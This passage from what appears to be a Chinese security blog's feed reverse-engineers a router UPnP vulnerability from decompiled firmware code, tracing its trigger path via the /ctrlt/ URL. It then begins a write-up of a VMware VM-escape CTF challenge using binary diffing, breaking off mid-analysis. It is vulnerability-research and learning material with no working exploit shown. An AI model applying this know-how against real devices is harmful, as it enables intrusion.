punctuation">;</span>      local_c8 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_104<span class="token punctuation">,</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_cc <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_100<span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_d0 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_100<span class="token punctuation">,</span><span class="token number">0x22</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_d4 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_100<span class="token punctuation">,</span><span class="token number">0x2e</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_d8 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_100<span class="token punctuation">,</span><span class="token number">0x2f</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_dc <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_100<span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_e0 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_104<span class="token punctuation">,</span><span class="token number">0x29</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_e4 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_104<span class="token punctuation">,</span><span class="token number">0x2a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      iVar2 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_104<span class="token punctuation">,</span><span class="token number">0x2b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      iVar3 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_104<span class="token punctuation">,</span><span class="token number">0x2c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      iVar4 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_104<span class="token punctuation">,</span><span class="token number">0x2d</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      iVar6 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f0<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0x23</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      iVar7 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f0<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0x24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      iVar8 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f0<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0x25</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      iVar9 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f0<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0x26</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      iVar10 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f0<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0x27</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      iVar5 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f0<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0x28</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      iVar5 <span class="token operator">=</span> iVar1 <span class="token operator">+</span> local_e8 <span class="token operator">+</span> local_2c <span class="token operator">+</span> local_30 <span class="token operator">+</span> local_34 <span class="token operator">+</span> local_38 <span class="token operator">+</span> local_3c <span class="token operator">+</span> local_40 <span class="token operator">+</span>              local_44 <span class="token operator">+</span> local_48 <span class="token operator">+</span> local_4c <span class="token operator">+</span> local_50 <span class="token operator">+</span> local_54 <span class="token operator">+</span> local_58 <span class="token operator">+</span> local_5c <span class="token operator">+</span> local_60              <span class="token operator">+</span> local_64 <span class="token operator">+</span> local_68 <span class="token operator">+</span> local_6c <span class="token operator">+</span> local_70 <span class="token operator">+</span> local_74 <span class="token operator">+</span> local_78 <span class="token operator">+</span> local_7c <span class="token operator">+</span>              local_80 <span class="token operator">+</span> local_84 <span class="token operator">+</span> local_88 <span class="token operator">+</span> local_8c <span class="token operator">+</span> local_90 <span class="token operator">+</span> local_94 <span class="token operator">+</span> local_98 <span class="token operator">+</span> local_9c              <span class="token operator">+</span> local_a0 <span class="token operator">+</span> local_a4 <span class="token operator">+</span> local_a8 <span class="token operator">+</span> local_ac <span class="token operator">+</span> local_b0 <span class="token operator">+</span> local_b4 <span class="token operator">+</span> local_b8 <span class="token operator">+</span>              local_bc <span class="token operator">+</span> local_c0 <span class="token operator">+</span> local_c4 <span class="token operator">+</span> local_c8 <span class="token operator">+</span> local_cc <span class="token operator">+</span> local_d0 <span class="token operator">+</span> local_d4 <span class="token operator">+</span> local_d8              <span class="token operator">+</span> local_dc <span class="token operator">+</span> local_e0 <span class="token operator">+</span> local_e4 <span class="token operator">+</span> iVar2 <span class="token operator">+</span> iVar3 <span class="token operator">+</span> iVar4 <span class="token operator">+</span> iVar6 <span class="token operator">+</span> iVar7 <span class="token operator">+</span> iVar8 <span class="token operator">+</span>              iVar9 <span class="token operator">+</span> iVar10 <span class="token operator">+</span> iVar5<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> iVar5<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>函数较长，可以不用每一行都明白，大致看懂了该函数的意思是，对于需要通信的设备和服务，进行各自的操作，跟进Action函数，查看一下后续操作。</p><p>在后续的操作中，不难发现该函数存在一个明显的间接函数调用。</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c">undefined4 <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span><span class="token keyword">int</span> param_1<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>param_2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> iVar1<span class="token punctuation">;</span>  <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>ppcVar2<span class="token punctuation">;</span>  <span class="token keyword">char</span> <span class="token operator">*</span>__s1<span class="token punctuation">;</span>  <span class="token keyword">char</span> <span class="token operator">*</span>__s2<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>param_1 <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>param_1 <span class="token operator">+</span> <span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    ppcVar2 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>param_1 <span class="token operator">+</span> <span class="token number">0x24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>ppcVar2 <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      __s2 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>g_astActionArray <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>param_2 <span class="token operator">*</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">do</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>uint<span class="token punctuation">)</span>ppcVar2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0x40000000</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          __s1 <span class="token operator">=</span> <span class="token operator">*</span>ppcVar2<span class="token punctuation">;</span>          iVar1 <span class="token operator">=</span> <span class="token function">strcmp</span><span class="token punctuation">(</span>__s1<span class="token punctuation">,</span>__s2<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>iVar1 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">ATP_UPNP_Free</span><span class="token punctuation">(</span>__s1<span class="token punctuation">)</span><span class="token punctuation">;</span>            ppcVar2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>uint<span class="token punctuation">)</span>ppcVar2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0xbfffffff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token operator">*</span>ppcVar2 <span class="token operator">=</span> param_2<span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        ppcVar2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>ppcVar2<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span>ppcVar2 <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token number">0x40090000</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>在函数的第13行，<code>__s2 = *(char **)(g_astActionArray + (int)param_2 * 0x10);</code><br>查看该全局的函数变量。但是发现没有识别出来这里数据的类型，由于不太会操作Ghidra，所以又回到了IDA，定位到该区域，手动识别了一下（懒得写idapython脚本）<br><img src="https://i.bmp.ovh/imgs/2022/01/3e9c043151bb8b36.png" alt=""></p><p>全局的虚表，使用0和1来标号，如果为0则偏移8的位置是函数，如果为1则偏移8的位置是字符串数据。以此来作为一个标记，来有序的，并且保证正确类型向调用者提供接口。</p><p>然后回过头来，查看一下上一页的调用。该服务的参数对应的是偏移为0和1的位置，关联到本函数，取出的是74偏移的字符串。</p><p>此时发现第一个函数有点眼熟，进去一看</p><p><img src="https://i.bmp.ovh/imgs/2022/01/85901983c9b7f862.png" alt=""></p><p>发现就是漏洞函数。于是确定了该漏洞函数的触发时利用间接的虚表调用。检查该虚表的交叉引用。</p><p><img src="https://i.bmp.ovh/imgs/2022/01/6beab2d510dcaca8.png" alt=""></p><p>调用出了本函数全都是<code>UPnPGetActionByName</code>函数。</p><p>然后一直向上检查交叉引用，检查到了<code>ATP_UPNP_Init</code>函数。该函数时初始化upnp服务时候所调用的函数，</p><p>那么至此该漏洞的出发链也已经完全发现了。</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">main -<span class="token operator">></span> ATP+UPNP_init -<span class="token operator">></span> sub_40B5B4 -<span class="token operator">></span> sub_40A9C8 -<span class="token operator">></span> UPnPGetActionByName<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><h3 id="漏洞触发位置"><a class="header-anchor" href="#漏洞触发位置">¶</a>漏洞触发位置</h3><p>看一下最终触发漏洞的函数。</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c">undefined4 <span class="token function">UPnPGetActionByName</span><span class="token punctuation">(</span><span class="token keyword">int</span> param_1<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>param_2<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>param_3<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>param_4<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> iVar1<span class="token punctuation">;</span>  <span class="token keyword">int</span> iVar2<span class="token punctuation">;</span>  <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>ppcVar3<span class="token punctuation">;</span>  <span class="token keyword">char</span> <span class="token operator">*</span>pcVar4<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>param_1 <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>param_2 <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>param_4 <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token operator">*</span>param_4 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>ppcVar3 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>param_1 <span class="token operator">+</span> <span class="token number">0x24</span><span class="token punctuation">)</span><span class="token punctuation">;</span> ppcVar3 <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">;</span>        ppcVar3 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>ppcVar3<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      pcVar4 <span class="token operator">=</span> ppcVar3<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>uint<span class="token punctuation">)</span>pcVar4 <span class="token operator">&amp;</span> <span class="token number">0x40000000</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        pcVar4 <span class="token operator">=</span> <span class="token operator">*</span>ppcVar3<span class="token punctuation">;</span>        iVar1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>pcVar4 <span class="token operator">*</span> <span class="token number">0x10</span><span class="token punctuation">;</span>        iVar2 <span class="token operator">=</span> <span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>g_astActionArray <span class="token operator">+</span> iVar1<span class="token punctuation">)</span><span class="token punctuation">,</span>param_2<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>iVar2 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>           <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>g_astActionArray <span class="token operator">+</span> iVar1 <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span> <span class="token operator">||</span>            <span class="token punctuation">(</span>iVar1 <span class="token operator">=</span> <span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>g_astActionArray <span class="token operator">+</span> iVar1 <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span>param_3<span class="token punctuation">)</span><span class="token punctuation">,</span> iVar1 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>param_4 <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token operator">*</span>param_4 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>g_astActionArray <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>pcVar4 <span class="token operator">*</span> <span class="token number">0x10</span> <span class="token operator">+</span> <span class="token number">0xc</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          <span class="token keyword">return</span> <span class="token operator">*</span><span class="token punctuation">(</span>undefined4 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>g_astActionArray <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">*</span>ppcVar3 <span class="token operator">*</span> <span class="token number">0x10</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        iVar1 <span class="token operator">=</span> <span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token operator">*</span>ppcVar3<span class="token punctuation">,</span>param_2<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>iVar1 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>param_4 <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          <span class="token operator">*</span>param_4 <span class="token operator">=</span> pcVar4<span class="token punctuation">;</span>          <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>可以看到这里return返回的是，<code>return *(undefined4 *)(g_astActionArray + (int)*ppcVar3 * 0x10 + 8);</code>而<code>(ppcVar3 = *(char ***)(param_1 + 0x24)</code><br>返回上级调用查看第一个参数。</p><p><img src="https://i.bmp.ovh/imgs/2022/01/737c1bd8ec3d0bde.png" alt=""></p><p>继续查看<code>UpnpGetServiceByUrl</code>函数。</p><p><img src="https://i.bmp.ovh/imgs/2022/01/1256eca8a4f1d763.png" alt=""></p><p>经过了预处理之后，如果还没有返回，那么就会继续接下来的判断。</p><p><img src="https://i.bmp.ovh/imgs/2022/01/f12f04bdca370358.png" alt=""></p><p>这样的判断和虚表有些类似，但是暂时和我们所需要的分析函数中的<code>g_pstUpnpGvarHead</code>变量没有关系，这个变量在反汇编器中也看不到。</p><p>继续看这个函数，再<code>if</code>判断之后，还有一个<code>strcmp</code>函数，可以发现这个比较函数的参数1，已经又snprintf改编为了目前偏移位置的函数。进行了第二次函数判别，判断该服务是否是调用者要调用的目标服务。</p><p>所以能够确定该函数是一个，确定调用者调用服务的函数，就是说只要访问<code>url</code><br><code>/ctrlt/函数服务</code>就可以访问对应的服务，但是仔细看就会发现<code>snprintf</code>函数给函数服务规定了一定的格式。</p><p><img src="https://i.bmp.ovh/imgs/2022/01/d89af09884dad711.png" alt=""></p><p>只有满足<code>Name_num</code>的格式才是一个合法的服务。关于这个关键的全局变量<code>g_pstUpnpGvarHead</code>该变量只有在<code>UPNP_Init</code>函数才被调用，于是继续往上追踪该变量。</p><p>在初始化函数中发现，在这一句中初始化了：<code>g_pstUpnpGvarHead = (int *)ATP_UTIL_GVarGetValue(0x20001,0);</code></p><p>并且该函数是个链接函数，所以无法得知其内容，那么该变量的分析先告一段落，后期会动态调试获得该内存的内容。</p><p>回到<code>sub_40A9C8</code>函数调用<code>UpnpGetServiceByUr</code>的位置。发现调用该函数之前也是一些url的分析，调用该函数之后，</p><p><img src="https://i.bmp.ovh/imgs/2022/01/f65dfda3721d709d.png" alt=""></p><p>是在解析xml格式的文件。解析完了格式就会调用漏洞函数，所以断定，想要触发函数，一定要获得目标全局变量的值，使用qemu-mips-static开启调试模式发现，不会进入到upnp初始化里面去，可能是该服务的原因。</p><h2 id="总结"><a class="header-anchor" href="#总结">¶</a>总结</h2><ul><li>逆向服务的时候，要细致，能动调就调试，但是不能一上来就调试，中间有许多的细节还是不要丢失</li><li>路由器漏洞入门，学到了许多新的知识，也是分析的第一个CVE，耗时1天半</li><li>命令注入，多寻找system函数，这类函数在大型的项目中基本都使用</li></ul>]]></content>
    
    
    <categories>
      
      <category>CVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>IOT</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>虚拟机逃逸（二）</title>
    <link href="/2022/06/22/%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%83%E9%80%B8%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <url>/2022/06/22/%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%83%E9%80%B8%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<blockquote><p>本文首发于奇安信攻防社区:<a href="https://forum.butian.net/share/1678">https://forum.butian.net/share/1678</a></p></blockquote><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>初次分析虚拟机逃逸，之前分析了一篇rwctf2018，这次视线转到强网杯的一个虚拟机逃逸分析。难度比rw大一点点，但是逆向分析还是重点，所以也不会差到哪里去。</p><p>一些有关基础的链接放在这里，不做赘述。</p><p><a href="https://nafod.net/blog/2019/12/21/station-escape-vmware-pwn.html">题解</a></p><p><a href="http://sysprogs.com/legacy/articles/kdvmware/guestrpc.shtml">RPC&#x2F;backdoor机制</a></p><h2 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h2><h3 id="bindiff"><a href="#bindiff" class="headerlink" title="bindiff"></a>bindiff</h3><p>这类题目都会给一个patched的vmx文件，安装vmware后，在<code>/usr/lib/vmware/bin</code>目录下可以找到目标vmx。使用bindiff比较patched和patch之前的区别可以迅速定位漏洞的位置。</p><p>（bindiff分析太慢了，这次选择了010）</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-89eec2810b186d524efda555894cca9031ad35e7.png" alt="图片.png"></p><p>有三处不同，ida定位到关键位置。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-18b396ee70885b34dc4b57846efde51baa0d1a1f.png" alt="图片.png"></p><p>一处把r12d改成了r12w，相当于省略了r12的高位。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-b9b1beba56c3803f31e032d2c8476ce9c7d9fda8.png" alt="图片.png"></p><p>把跳转的条件改为了大于等于。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-a25862dfd05d6be26c03539e4ccba81caefc64ab.png" alt="图片.png"></p><p>跳转改为了无条件。</p><p>最后一个改变，取消了条件检查，前两处patch改变如下。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-2c772477f3bc5dde104c35b1d042d567f8c8da28.png" alt="图片.png"></p><p>本能的反应就是realloc函数的漏洞，这类题在常规pwn中很常见，realloc函数第二个size参数如果为0，则和free效果一样，常常会导致DF、UAF.接下来细看一下伪代码。</p><h3 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h3><p>Vmx漏洞依然位于guestRPC的处理函数中，该函数中使用了一个大的switch处理不同的信息。接下来详细分析。（虚拟机逃逸（一）中只给了分析的结构体）</p><p>关于一些基础知识可以看<a href="">虚拟机逃逸（一）</a></p><h4 id="Open-RPC-channel"><a href="#Open-RPC-channel" class="headerlink" title="Open_RPC_channel"></a>Open_RPC_channel</h4><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-1f4c153972dee2b077f41122e57c31023c87979c.png" alt="图片.png"></p><p>这是switch下最简单的一个分支了，打开信道，内容就是简单的接受数据包，然后获得magicnum（这部分是调试得到的）</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-4ac942da8b78bba6ed812cf7878a8b0b70561da5.png" alt="图片.png"></p><p>magicnum会进行一个比较如果失败就直接退出。</p><h4 